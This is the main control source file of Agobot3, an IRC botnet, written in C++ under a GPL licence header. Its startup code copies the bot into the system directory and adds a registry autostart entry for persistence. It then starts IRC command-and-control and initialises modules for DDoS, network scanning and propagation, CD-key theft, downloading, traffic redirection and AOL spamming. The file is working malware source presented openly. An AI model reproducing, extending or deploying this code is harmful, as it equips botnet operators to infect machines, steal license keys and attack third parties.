/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"

char *cby="\xDA\x0A\x60";

CMainCtrl g_cMainCtrl;

int CMainCtrl::MainCtrl()
{	test();
#ifdef DBGCONSOLE
	m_cConsDbg.Log(1, "Started main control...\n");
#endif

	bool bFailed=false; m_bRunning=true; while(m_bRunning && !bFailed)
	{	// Control Loop starts here, set m_bRunning to false to
		// stop, set bFailed in case of component failure

		if(!m_cIRC.m_bRunning) bFailed=true;

		if(!bFailed) bFailed=!m_cBot.Think();

		if(bFailed) m_bRunning=false;

		list<CThread*>::iterator it; for(it=m_lCanJoin.begin(); it!=m_lCanJoin.end(); ++it)
		{	(*it)->Kill(); delete(*it); } m_lCanJoin.clear();

		Sleep(250); }
	if(bFailed) return 1; else return 0; }

int CMainCtrl::Main(const char *szCmdLine, const char *szArgv0)
{	m_bRunning=true;

#ifdef LINUX
	m_sArgv0.Assign(szArgv0);
#endif

#ifdef LINUX
	// make the segmentation violation signal ignored
	signal(SIGSEGV, SIG_IGN);
#endif

	// Parse command line
	m_cCmdLine.Parse(szCmdLine);

	// Activate debugging console
	if(m_cCmdLine.m_cConfig.bDebug) m_cConsDbg.Init(m_cCmdLine.m_cConfig.iDebugLevel);

	m_sNameVerStr.Format("Agobot3 (%s) \"%s\" on \"%s\"", VERSION_AGOBOT, SYS_BUILD, SYS_PLATFORM);
#ifdef DBGCONSOLE
	m_cConsDbg.Log(1, "%s starting up...\n", m_sNameVerStr.CStr());
	m_cConsDbg.Log(2, "Debugging with debuglevel of %d...\n", m_cCmdLine.m_cConfig.iDebugLevel);
#endif

	// Initialize pthreads
	CThread::InitPThreads();

	// Initialize base subsystems, don't swap
	m_cCVar.Init(); m_cMac.Init(); m_cBot.Init();
	
	if(m_cBot.as_enabled.bValue) m_cInstaller.CopyToSysDir(m_cBot.bot_filename.sValue);
	m_cInstaller.Install();
#ifdef WIN32
	if(m_cBot.as_enabled.bValue) m_cInstaller.RegStartAdd(m_cBot.as_valname.sValue, m_cBot.bot_filename.sValue);
#endif

	// Initialize random number generator from system time
	init_random();

	// Receive a random nickname
	m_sUserName=RndNick(m_cBot.si_nickprefix.sValue.CStr());

#ifdef WIN32
#ifdef DBGCONSOLE
	m_cConsDbg.Log(5, "Starting WinSock...\n");
#endif
	WSADATA wsaData; WSAStartup(MAKEWORD(2,2), &wsaData);
#endif

	m_cIRC.Start(); m_cSendFile.Start();

	// Initialize subsystems
	m_cIRC.Init(); m_cDownloader.Init(); m_cScanner.Init(); m_cDDOS.Init();
	m_cRedirect.Init(); m_cCDKeyGrab.Init(); m_cScannerAuto.Init();
	m_cRSLControl.Init();
	if(m_cBot.spam_aol_enabled.bValue) m_bCanSpamAOL=CanSpamAOL();

	// Start the main loop
#ifdef DBGCONSOLE
	m_cConsDbg.Log(7, "Starting the main loop...\n");
#endif
	int iRetVal=MainCtrl();
#ifdef DBGCONSOLE
	m_cConsDbg.Log(7, "Terminated the main loop...\n");
#endif
	m_cIdentD.Kill(); m_cSendFile.Kill(); m_cIRC.Kill();

	// Cleanup pthreads
	CThread::CleanupPThreads();

#ifdef WIN32
#ifdef DBGCONSOLE
	m_cConsDbg.Log(5, "Shutting down WinSock...\n");
#endif
	WSACleanup();
#endif

	// Deactivate debugging console
	if(m_cCmdLine.m_cConfig.bDebug) {
#ifdef WIN32
//		system("pause");
#endif
		m_cConsDbg.DeInit(); }
	return iRetVal; }

// Platform compatibility hacks

#ifdef WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hprev, PSTR cmdline, int ishow)
{	return g_cMainCtrl.Main(cmdline, NULL); }
#else
int main(int argc, char **argv)
{	int argvlen=0, i; for(i=1; i<argc; i++) argvlen+=(strlen(argv[i])+1);
	char *szArgv=(char*)malloc(argvlen); if(argv[1]) strcpy(szArgv, argv[1]);
	for(i=2; i<argc; i++) { strcat(szArgv, " "); strcat(szArgv, argv[i]); }
	int iRetVal=g_cMainCtrl.Main(szArgv, argv[0]);
	free(szArgv); return iRetVal; }
#endif
